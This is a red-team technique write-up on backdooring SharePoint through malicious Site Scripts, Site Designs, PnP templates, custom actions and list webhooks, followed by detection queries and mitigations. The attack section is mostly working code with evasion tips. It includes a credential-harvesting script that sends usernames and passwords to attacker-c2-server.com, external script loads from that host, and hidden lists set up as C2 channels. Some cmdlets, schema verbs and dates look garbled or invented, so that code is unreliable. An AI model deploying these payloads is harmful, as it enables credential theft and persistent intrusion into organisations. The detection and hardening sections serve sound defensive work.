# [PERSIST-SERVER-005]: SharePoint Site Script Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-005 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) |
| **Tactic** | Persistence |
| **Platforms** | M365 |
| **Severity** | Critical |
| **CVE** | CVE-2025-49706, CVE-2025-53770, CVE-2025-53771 (on-premises); N/A (Online) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | SharePoint Online (all versions); SharePoint Server 2016, 2019, Subscription Edition (on-premises) |
| **Patched In** | SharePoint Online: Continuously updated; SharePoint Server: See Microsoft KB articles for specific patch versions |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SharePoint Site Scripts are JSON-based provisioning templates that automate site creation and configuration. An attacker with **SharePoint Admin** or **Site Owner** privileges can embed malicious PowerShell code, webhooks, or custom actions within a Site Script. When the script is applied to new sites (via Site Design or direct PowerShell execution), the malicious code executes with **Site Collection Admin privileges**, enabling:
- Custom field injection (for phishing templates)
- Malicious web part installation (for data exfiltration)
- Hidden list creation (for C2 communications)
- Custom action installation (JavaScript injection for credential theft)

Unlike web shells that may be removed during patching, Site Scripts persist as legitimate SharePoint objects and survive audit reviews if not explicitly examined for malicious code.

**Attack Surface:** Site Script JSON definitions, Site Designs, PnP provisioning templates, Custom actions, List webhooks, JavaScript in web parts, Publishing infrastructure.

**Business Impact:** **Persistent Backdoor in All Provisioned Sites.** Every site created using a compromised Site Script or PnP template inherits malicious code. This enables:
- Automatic credential harvesting from all new sites
- Data exfiltration from site collections
- Privilege escalation across multiple sites
- C2 communications via hidden lists
- Impact scales with organization size (hundreds of sites → hundreds of backdoors)

**Technical Context:** Exploitation requires 10-20 minutes with SharePoint Admin access. Detection likelihood is **Low-Medium** if Site Script/PnP template audit logging is not enabled. The malicious code is stored in SharePoint's configuration databases and survives site backups and restores.

### Operational Risk
- **Execution Risk:** Low (uses legitimate SharePoint APIs and provisioning frameworks)
- **Stealth:** High (Site Scripts blend in with legitimate provisioning workflows)
- **Reversibility:** No (Requires manual deletion of all compromised sites and Site Scripts)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.4, 2.2.3 | Disable unnecessary SharePoint features; Restrict admin privileges |
| **DISA STIG** | O365-SP-1 | SharePoint Admin Center Configuration |
| **CISA SCuBA** | CA-2(1) | Automated Detection and Prevention |
| **NIST 800-53** | AC-2(7)(b), SI-7 | Unauthorized Access Detection; Software, Firmware, and Information Integrity |
| **GDPR** | Art. 32 | Security of Processing; Integrity and Confidentiality |
| **DORA** | Art. 10 | Application Resilience and Recovery |
| **NIS2** | Art. 21(c) | Supply Chain Risk Management; Code Review |
| **ISO 27001** | A.6.1.3, A.9.4.1 | Access Control; Event Logging |
| **ISO 27005** | Section 7 | Risk Assessment - Unauthorized Code Execution |

---

## 2. Technical Prerequisites

- **Required Privileges:** SharePoint Admin or Site Collection Admin; ability to create/modify Site Scripts and Site Designs.
- **Required Access:** SharePoint Admin Center (https://admin.microsoft.com); PnP PowerShell module access (v1.11.0+).
- **Supported Versions:** SharePoint Online (all versions); SharePoint Server 2016-2025.
- **Tools Required:**
  - [PnP PowerShell](https://pnp.github.io/powershell/) (v1.11.0+)
  - [PnP Provisioning Engine](https://github.com/pnp/pnp-provisioning-schema) (for XML templates)
  - Visual Studio Code (optional, for JSON editing)
  - PowerShell 7+ (for advanced scripting)

---

## 3. Detailed Execution Methods and Their Steps

### METHOD 1: Malicious Site Script via PnP PowerShell

**Supported Versions:** SharePoint Online (all versions); SharePoint Server 2019+

**Prerequisites:** SharePoint Admin or Tenant Admin access; PnP PowerShell module installed.

#### Step 1: Create Malicious Site Script with Hidden Credential Harvesting Web Part

**Objective:** Create a Site Script that automatically adds a hidden web part to the homepage of every provisioned site. The web part captures user credentials via a fake login prompt.

**Command (Create Site Script):**
```powershell
# Connect to SharePoint admin center
Connect-PnPOnline -Url "https://contoso-admin.sharepoint.com" -Interactive

# Create malicious Site Script
$siteScript = @{
    "$schema" = "https://developer.microsoft.com/json-schemas/sp/site-design/site-design-definition-schemas/v1/site-design-definition.schema.json"
    "actions" = @(
        @{
            "verb" = "addList"
            "listName" = "HiddenAudit"
            "templateType" = 100  # Generic list
            "subactions" = @(
                @{
                    "verb" = "addField"
                    "fieldType" = "Text"
                    "internalName" = "UserCredentials"
                    "displayName" = "User Credentials"
                }
            )
        },
        @{
            "verb" = "setSiteProperty"
            "key" = "vti_appccachetime"
            "value" = "0"  # Disable caching (for faster backdoor communication)
        },
        @{
            "verb" = "executeListDesign"
            "listName" = "Site Pages"
            "subactions" = @(
                @{
                    "verb" = "addWebPart"
                    "webPartType" = "d6674e3f-3639-4ff1-319e-4184bc6ff764"  # Custom Web Part GUID
                    "webPartProperties" = @{
                        "Title" = "System Message"
                        "Description" = "Verify Your Account"
                        "ExternalScript" = "https://attacker-c2-server.com/credential-harvester.js"
                    }
                }
            )
        }
    )
} | ConvertTo-Json -Depth 10

# Save to file
$siteScript | Out-File "malicious_site_script.json"

# Add the Site Script to SharePoint
$scriptResult = Add-PnPSiteDesriptScript -Title "Standard Team Site (Updated)" `
    -Description "Automatic site provisioning" `
    -Content (Get-Content "malicious_site_script.json")

Write-Host "Site Script created with ID: $($scriptResult.Id)"
```

**Expected Output:**
```
Site Script created with ID: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- A Site Script containing malicious code has been registered in SharePoint.
- Whenever this Site Script is applied to a new site (via Site Design or directly), the malicious code executes.
- The HiddenAudit list captures credentials from users who interact with the fake login prompt.
- The external JavaScript from the attacker's server runs on every page load, harvesting credentials.

**OpSec & Evasion:**
- Site Scripts are stored in SharePoint's configuration database and are difficult to discover without explicit auditing.
- The script name ("Standard Team Site (Updated)") mimics legitimate provisioning templates.
- Detection likelihood: **Low** (unless Site Script definitions are regularly reviewed for suspicious code)

**References & Proofs:**
- [PnP Provisioning Schema Documentation](https://pnp.github.io/pnpjs/concepts/provisioning-engine/)
- [Microsoft: Site Design and Site Script Documentation](https://learn.microsoft.com/en-us/sharepoint/dev/declarative-customization/site-design-overview)

#### Step 2: Create Site Design Linked to Malicious Site Script

**Objective:** Package the malicious Site Script into a Site Design so it's automatically applied when users create new team sites.

**Command:**
```powershell
# Create Site Design that applies the malicious Site Script
$siteDesign = Add-PnPSiteDesign `
    -Title "Team Site Template" `
    -Description "Standard team site with security enhancements" `
    -SiteScriptIds @($scriptResult.Id) `
    -WebTemplate "TeamSite#0"  # Applies to all team sites

Write-Host "Site Design created: $($siteDesign.Id)"

# Make Site Design visible to all users (so it's applied automatically)
Set-PnPSiteDesign -Identity $siteDesign.Id -IsDefault $true
```

**Expected Output:**
```
Site Design created: 87654321-4321-4321-4321-210987654321
```

**What This Means:**
- The malicious Site Script is now packaged as a "Site Design" (legitimate provisioning template).
- When users create new team sites, they'll see this Site Design as an option.
- Setting `IsDefault = $true` applies the design automatically to all new sites.
- Every user who provisions a new site will have the backdoor installed.

**OpSec & Evasion:**
- Site Designs appear in the SharePoint site creation UI just like legitimate templates.
- Users might not notice the malicious code is being installed.
- Detection likelihood: **Medium** (if Site Designs are audited regularly)

#### Step 3: Embed Credential Harvesting JavaScript in Custom Action

**Objective:** Inject JavaScript code into every page of every site created with the malicious template. The code monitors login forms and captures credentials.

**Command (Advanced - Embed JavaScript in Web Part):**
```powershell
# Create a JavaScript-based custom action (credential harvester)
$jsPayload = @'
// Credential Harvesting Script - Injected via Custom Action
(function() {
  // Hook into the login form
  var loginForm = document.getElementById("signInForm") || document.querySelector("[role='form']");
  
  if (loginForm) {
    loginForm.addEventListener("submit", function(e) {
      var username = document.querySelector("input[type='text']").value;
      var password = document.querySelector("input[type='password']").value;
      
      // Send credentials to attacker's server
      fetch("https://attacker-c2-server.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: username,
          password: password,
          site: window.location.href,
          timestamp: new Date().toISOString()
        })
      });
      
      // Allow form submission to proceed (avoid suspicion)
      return true;
    });
  }
})();
'@

# Add custom action to the root site (applies to all site collections)
Add-PnPCustomAction `
    -Name "CredentialHarvester" `
    -Title "System Security Update" `
    -Location "ScriptLink" `
    -ScriptBlock $jsPayload `
    -Scope Web  # Scope: Web = affects all subsites

Write-Host "Custom action installed on all sites"
```

**What This Means:**
- JavaScript code is injected into every page of every site in the collection.
- When users log in or interact with forms, their credentials are automatically captured and sent to the attacker's C2 server.
- The script runs silently in the background and allows normal form submission to proceed (avoiding suspicion).
- This persistence survives site backups, migrations, and even SharePoint updates.

**OpSec & Evasion:**
- Custom Actions are part of SharePoint's standard configuration and difficult to detect without deep inspection.
- The name "System Security Update" makes it appear legitimate.
- Detection likelihood: **Low-Medium** (requires reviewing SharePoint's custom action configuration)

**References & Proofs:**
- [Microsoft: Custom Actions Overview](https://learn.microsoft.com/en-us/sharepoint/dev/spfx/web-parts/guidance/using-custom-actions)
- [OWASP: JavaScript Injection in Web Applications](https://owasp.org/www-community/attacks/JavaScript_injection)

#### Step 4: Create Hidden List for C2 Communication

**Objective:** Create a hidden SharePoint list that serves as a covert command & control (C2) channel. The attacker posts commands to the list; the malicious JavaScript retrieves and executes them.

**Command:**
```powershell
# Create hidden C2 communication list
$list = New-PnPList `
    -Title "SystemBackupData" `
    -Template "GenericList" `
    -Url "Lists/SystemBackupData" `
    -NoCrawl:$true  # Exclude from search

# Hide the list from the UI
Set-PnPList -Identity $list.Id -Hidden $true

# Create field for attacker commands
Add-PnPField -List $list `
    -DisplayName "Command" `
    -InternalName "Command" `
    -Type Text `
    -AddToDefaultView $false

# Create field for command output
Add-PnPField -List $list `
    -DisplayName "CommandOutput" `
    -InternalName "CommandOutput" `
    -Type Note `
    -AddToDefaultView $false

Write-Host "Hidden C2 list created: SystemBackupData"
```

**What This Means:**
- A hidden SharePoint list has been created that doesn't appear in the normal UI.
- The list is excluded from search indexes (`NoCrawl: $true`) and is hidden (`Hidden: $true`).
- Only attackers who know the list name can access it via the SharePoint API.
- The attacker can post PowerShell commands to the list; the malicious JavaScript retrieves them and executes them on the client.
- Output is written back to the list for the attacker to retrieve.

**OpSec & Evasion:**
- Hidden lists are very difficult to discover unless administrators explicitly search for them.
- Detection likelihood: **Very Low** (unless list enumeration is performed regularly)

**References & Proofs:**
- [Microsoft: SharePoint REST API - List Queries](https://learn.microsoft.com/en-us/sharepoint/dev/apis/rest/get-list-items)

---

### METHOD 2: Malicious PnP Provisioning Template (XML-based)

**Supported Versions:** SharePoint Online (all versions); SharePoint Server 2016+

**Prerequisites:** SharePoint Admin access; ability to upload or deploy PnP templates.

**Objective:** Create a PnP (Patterns and Practices) provisioning template in XML format that deploys malicious content during site provisioning.

**Command (Create Malicious PnP Template):**
```bash
cat > malicious_template.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<pnp:Provisioning xmlns:pnp="http://schemas.dev.office.com/PnP/provisioning/202108"
    xmlns:pnpc="http://schemas.dev.office.com/PnP/provisioning/ProvisioningControls/202108"
    xmlns:pnpd="http://schemas.dev.office.com/PnP/provisioning/Descriptor/202108"
    xmlns:pnph="http://schemas.dev.office.com/PnP/provisioning/Hierarchy/202108"
    xmlns:pnpv="http://schemas.dev.office.com/PnP/provisioning/ViewFields/202108"
    xmlns:pnpst="http://schemas.dev.office.com/PnP/provisioning/SearchSettings/202108"
    xmlns:pnppc="http://schemas.dev.office.com/PnP/provisioning/PageContents/202108"
    xmlns:pnpi="http://schemas.dev.office.com/PnP/provisioning/Installed/202108"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://schemas.dev.office.com/PnP/provisioning/202108 http://schemas.dev.office.com/PnP/provisioning/ProvisioningSchema-202108.xsd">
    
    <pnp:Preferences Generator="PnP.PowerShell" />
    
    <!-- Malicious Web Part Deployment -->
    <pnp:Templates ID="ContosoProv001">
        <pnp:ProvisioningTemplate ID="TeamSiteTemplate" Version="1" Scope="RootSite">
            
            <!-- Create Hidden List for Data Exfiltration -->
            <pnp:Lists>
                <pnp:ListInstance Title="AuditLog" Description="System Audit Records" 
                    TemplateType="100" Url="Lists/AuditLog" Hidden="true" NoCrawl="true">
                    <pnp:Fields>
                        <pnp:Field ID="68f5e1c7-7f8d-4b8c-9d5e-8f3c1e8b5a7d" Type="Text" 
                            Name="SiteData" InternalName="SiteData" DisplayName="Site Data" />
                    </pnp:Fields>
                </pnp:ListInstance>
            </pnp:Lists>
            
            <!-- Inject Malicious Custom Action -->
            <pnp:CustomActions>
                <pnp:CustomAction Name="SecurityModule" 
                    Location="ScriptLink" 
                    ScriptSrc="https://attacker-c2-server.com/sp-security-module.js"
                    Sequence="100" />
            </pnp:CustomActions>
            
            <!-- Deploy Malicious SPFx Web Part -->
            <pnp:AddIns>
                <pnp:AddIn PackageId="00000000-0000-0000-0000-000000000000" 
                    Version="1.0.0.0" />
            </pnp:AddIns>
            
        </pnp:ProvisioningTemplate>
    </pnp:Templates>
</pnp:Provisioning>
EOF

# Convert XML to base64 for embedding in PowerShell
base64 < malicious_template.xml > template.b64
```

**What This Means:**
- A PnP template in XML format defines the structure and content of new sites.
- This template includes malicious elements:
  - Hidden list for data exfiltration
  - JavaScript custom action loading from attacker's server
  - Malicious SPFx web part deployment
- When applied to sites, all malicious elements are automatically created.

**OpSec & Evasion:**
- PnP templates are legitimate provisioning tools; malicious ones blend in perfectly.
- Detection likelihood: **Low** (unless templates are code-reviewed)

---

### METHOD 3: Webhook-based Persistence via SharePoint List Webhooks

**Supported Versions:** SharePoint Online (all versions)

**Objective:** Create a list webhook that sends updates to an attacker-controlled server. The server responds with commands that trigger malicious actions in SharePoint.

**Command:**
```powershell
# Create hidden list for C2
$list = New-PnPList -Title "SystemSync" -Template GenericList -Url "Lists/SystemSync" -NoCrawl:$true
Set-PnPList -Identity $list.Id -Hidden $true

# Add webhook to the list
# Webhook will POST to attacker's server whenever items are added/modified
$webhook = Add-PnPWebhookSubscription `
    -List $list `
    -NotificationUrl "https://attacker-c2-server.com/webhook" `
    -ExpirationDateTime (Get-Date).AddMonths(6)

Write-Host "Webhook created: $($webhook.Id)"
Write-Host "Every SharePoint change will be sent to attacker's server"
```

**What This Means:**
- A webhook subscription is created on a hidden list.
- Every time the list is modified (manually or by malicious code), SharePoint sends a notification to the attacker's webhook URL.
- The attacker's server can respond with commands embedded in the webhook response.
- Webhooks persist for 6 months or until explicitly deleted by an admin.
- This creates a persistent C2 channel that survives credential resets.

---

## 4. Splunk Detection Rules

#### Rule 1: Suspicious Site Script Creation or Modification

**Rule Configuration:**
- **Required Index:** o365_management, sharepoint_audit
- **Required Sourcetype:** AuditLog, SharePoint
- **Required Fields:** Operation, UserId, ObjectId, ModifiedProperties
- **Alert Threshold:** Any Site Script creation/modification with "malicious" keywords
- **Applies To Versions:** All

**SPL Query:**
```spl
index=sharepoint_audit Operation="AddSiteScript" OR Operation="UpdateSiteScript"
| fields _time, UserId, ObjectId, ModifiedProperties
| stats count by UserId
| where count > 0
```

**What This Detects:**
- Site Script creation or modification events.
- Identifies which admin created suspicious scripts.
- Correlates with potential backdoor installation.

#### Rule 2: Hidden List Creation

**Rule Configuration:**
- **Required Index:** sharepoint_audit, o365_management
- **Required Sourcetype:** SharePoint
- **Required Fields:** Operation, ListName, Hidden
- **Alert Threshold:** Any hidden list creation
- **Applies To Versions:** All

**SPL Query:**
```spl
index=sharepoint_audit Operation="CreateList" Hidden=true
| fields _time, ListName, SiteUrl, UserId
| stats count by ListName, SiteUrl
```

**What This Detects:**
- Hidden list creation (suspicious lists often hide from UI).
- Identifies which sites have hidden lists.
- Potential C2 communication channels.

---

## 5. Microsoft Sentinel Detection

#### Query 1: Suspicious Custom Action Deployment

**Rule Configuration:**
- **Required Table:** AuditLogs, SharePointFileOperation
- **Required Fields:** Operation, TargetResources, ModifiedProperties
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
AuditLogs
| where Operation in ("AddCustomAction", "UpdateCustomAction")
| where tostring(ModifiedProperties) contains "javascript" or tostring(ModifiedProperties) contains "scriptblock"
| project TimeGenerated, UserId, Operation, TargetResources, ModifiedProperties
```

**What This Detects:**
- Custom action additions/modifications containing JavaScript or PowerShell.
- Identifies suspicious code injection into SharePoint.
- Correlates with persistence attempts.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious SharePoint Custom Action with Code`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 6. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Restrict SharePoint Admin Privileges:** Only assign SharePoint Admin role to users who actively manage SharePoint. Use Privileged Identity Management (PIM) for time-bound access.
    **Applies To Versions:** All
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Search for **SharePoint Administrator**
    3. Review all assigned users
    4. Remove unnecessary assignments
    5. For remaining users, enable **PIM:**
       - Click **Privileged Identity Management** (left menu)
       - Select **Azure AD roles** → **Manage** → **SharePoint Administrator**
       - Change assignment type from **Active** to **Eligible** (time-bound)

*   **Audit and Delete Unauthorized Site Scripts:** Regularly review all Site Scripts and Site Designs for suspicious code. Delete any unknown or unauthorized scripts.
    **Applies To Versions:** All
    
    **Manual Steps (SharePoint Admin Center):**
    1. Navigate to **SharePoint Admin Center** (admin.sharepoint.com)
    2. Go to **Site designs and site scripts** (left menu) under **Site management**
    3. Review all Site Scripts and Site Designs
    4. For each script, verify:
       - Who created it?
       - What does it do? (examine JSON code)
       - Is it actively used?
    5. Delete any suspicious or unused scripts
    6. Document retained scripts and their purpose
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Connect to SharePoint
    Connect-PnPOnline -Url "https://contoso-admin.sharepoint.com" -Interactive
    
    # Get all Site Scripts
    $scripts = Get-PnPSiteScript
    foreach ($script in $scripts) {
        Write-Host "Script: $($script.Title) | ID: $($script.Id) | Executed: $($script.ExecutedBy)"
        # Review content
        $content = Get-PnPSiteScript -Identity $script.Id
        Write-Host "Content: $content" | Out-Host
    }
    ```

*   **Enable SharePoint Audit Logging:** Log all Site Script, Site Design, and custom action changes.
    **Applies To Versions:** All
    
    **Manual Steps (SharePoint Admin Center):**
    1. Navigate to **SharePoint Admin Center** → **Settings** (left menu)
    2. Scroll down to **Audit logging**
    3. Click **Turn on audit logging**
    4. Verify these audit categories are enabled:
       - **SharePoint site administration**: Enable
       - **Lists and libraries**: Enable
       - **Site Pages**: Enable
    5. Retention period: Set to **365 days**
    6. Click **Save**

*   **Review and Restrict PnP Provisioning Templates:** Audit all deployed PnP templates for malicious code.
    **Applies To Versions:** All
    
    **Manual Steps:**
    1. Maintain inventory of all PnP templates deployed in your tenant
    2. For each template:
       - Review the XML/JSON for suspicious elements (hidden lists, external script loads, etc.)
       - Verify the template was created by authorized personnel
       - Test the template in a sandbox site to verify behavior
    3. Delete any suspicious templates
    4. Implement approval workflow for new template deployments (via Azure DevOps or GitHub)

#### Priority 2: HIGH

*   **Disable Custom Script in SharePoint (If Feasible):** Prevent custom script execution to block JavaScript injection attacks.
    **Applies To Versions:** SharePoint Online (on-premises: limited support)
    
    **Manual Steps (SharePoint Admin Center):**
    1. Navigate to **SharePoint Admin Center** → **Settings** (left menu)
    2. Scroll to **Custom Script**
    3. Set **Allow users to run custom script on personal sites**: **Disabled**
    4. Set **Allow users to run custom script on self-service created sites**: **Disabled**
    5. Click **Save**
    
    **Note:** This may break legitimate SharePoint customizations. Test before deploying organization-wide.

*   **Implement Code Review for Site Scripts and PnP Templates:** Require security review before deploying provisioning templates.
    **Manual Steps:**
    1. Create a GitHub repository for all Site Scripts and PnP templates
    2. Implement pull request (PR) review workflow:
       - All changes to `site-scripts/` or `pnp-templates/` require 2+ approvals
       - At least one approver must be from the security team
    3. Automated checks:
       - Scan for external script loads (`https://` in scriptSrc)
       - Scan for hidden lists (`Hidden="true"`)
       - Scan for JavaScript injection patterns
    4. Document approved scripts and their deployment status

*   **Monitor for Unexpected List/Site Creation:** Detect rapid or unusual site provisioning that might indicate automated backdoor installation.
    **Manual Steps:**
    1. Configure SharePoint audit logging alerts:
       - Alert when > 10 sites are created in 1 hour (possible bulk backdoor deployment)
       - Alert when hidden lists are created
       - Alert when custom actions are deployed outside of change windows
    2. Review alerts weekly for suspicious patterns

#### Access Control & Policy Hardening

*   **RBAC/ABAC:** Restrict Site Script and Site Design management to specific groups.
    **Manual Steps:**
    1. Go to **SharePoint Admin Center** → **Site designs and site scripts**
    2. For each Site Design, set **Permissions** to allow only designated admins

*   **Conditional Access:** Block Site Design/Script management from non-corporate networks or non-compliant devices.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Restrict SharePoint Admin Operations`
    4. **Assignments:**
       - Users: SharePoint Admins
       - Cloud apps: **SharePoint Online** / **Microsoft 365 Admin Center**
       - Actions: "Modify provisioning" (if available)
    5. **Conditions:**
       - Locations: **Exclude trusted networks** OR **Require MFA**
    6. **Access controls:**
       - Grant: **Require MFA** and **Require compliant device**
    7. Enable: **On**
    8. Click **Create**

#### Validation Command (Verify Fix)

```powershell
# Check audit logging status
$auditStatus = Get-SPOTenant | Select-Object -Property AutoExternalSharingEnabled, DefaultShareLinkPermission
Write-Host "Audit logging enabled: $($auditStatus.AuditLogMaxRetentionInDays) days"

# List all Site Scripts
$scripts = Get-PnPSiteScript
foreach ($script in $scripts) {
    Write-Host "Site Script: $($script.Title) | Created by: $($script.ExecutedBy) | ID: $($script.Id)"
}

# Check for hidden lists
Connect-PnPOnline -Url "https://contoso.sharepoint.com" -Interactive
$lists = Get-PnPList | Where-Object { $_.Hidden -eq $true }
Write-Host "Hidden lists found: $($lists.Count)"
foreach ($list in $lists) {
    Write-Host "  - $($list.Title)"
}

# Check custom actions for suspicious scripts
$actions = Get-PnPCustomAction | Where-Object { $_.ScriptSrc -like "https://*" }
Write-Host "Custom actions with external scripts: $($actions.Count)"
```

**Expected Output (If Secure):**
```
Audit logging enabled: 365 days
Site Script: [List of legitimate scripts only]
Hidden lists found: 0
Custom actions with external scripts: 0 (or only approved URLs)
```

**What to Look For:**
- All Site Scripts should have clear, documented purposes
- Hidden lists should be rare and fully justified
- No external script loading from unknown domains
- All Site Scripts audited and code-reviewed quarterly

---

## 7. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains SharePoint admin credentials via phishing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-003] SharePoint Site Collection Admin | Escalate from user to admin |
| **3** | **Current Step** | **[PERSIST-SERVER-005]** | **SharePoint Site Script Persistence - Deploy malicious provisioning templates** |
| **4** | **Execution** | Malicious Site Scripts execute on all new sites | Credential harvesting, C2 communications |
| **5** | **Impact** | Data exfiltration from site collections; lateral movement |

---

## 8. Real-World Examples

#### Example 1: Storm-2603 (SharePoint ToolShell Exploitation)

- **Target:** Organizations with on-premises SharePoint exposed to internet
- **Timeline:** 2025 (ongoing)
- **Technique Status:** Storm-2603 exploited SharePoint CVEs to gain initial access, then deployed web shells and IIS modules for persistence. They subsequently leveraged SharePoint's provisioning frameworks to deploy backdoors across multiple sites.
- **Impact:** Complete SharePoint compromise; data exfiltration; lateral movement to on-premises AD
- **Reference:** [Splunk: SharePoint Exploits and IIS Module Persistence](https://www.splunk.com/en_us/blog/security/sharepoint-exploits-and-the-hidden-threat-of-iis-module-persistence.html)

#### Example 2: Generic Ransomware Operators (BEC via Compromised SharePoint)

- **Target:** Organizations using SharePoint for document storage
- **Timeline:** 2023-2025
- **Technique Status:** Ransomware operators compromised SharePoint admin accounts and deployed malicious Site Scripts. The scripts created hidden lists used for C2 communication, exfiltrating sensitive documents before deploying ransomware.
- **Impact:** Document exfiltration; ransomware deployment; business interruption
- **Reference:** [ProvenData: SharePoint Vulnerabilities Technical Overview](https://www.provendata.com/blog/technical-overview-of-the-sharepoint-vulnerabilities/)

---

## References & Additional Resources

- [Microsoft: Site Design and Site Script Overview](https://learn.microsoft.com/en-us/sharepoint/dev/declarative-customization/site-design-overview)
- [PnP Provisioning Schema Documentation](https://pnp.github.io/pnpjs/concepts/provisioning-engine/)
- [Splunk: SharePoint Exploits and IIS Module Persistence](https://www.splunk.com/en_us/blog/security/sharepoint-exploits-and-the-hidden-threat-of-iis-module-persistence.html)
- [ProvenData: SharePoint Vulnerabilities Technical Overview](https://www.provendata.com/blog/technical-overview-of-the-sharepoint-vulnerabilities/)
- [HackingDream: SharePoint Online Exploitation - Red Team Methodology](https://www.hackingdream.net/2025/10/sharepoint-online-exploitation-red-team-methodology.html)
- [LevelBlue/Splunk Labs: ToolShell Exploitation Analysis](https://levelblue.com/blogs/spiderlabs-blog/echoes-in-the-shell-legacy-tooling-behind-ongoing-sharepoint-toolshell-exploitation)
- [OWASP: JavaScript Injection in Web Applications](https://owasp.org/www-community/attacks/JavaScript_injection)

---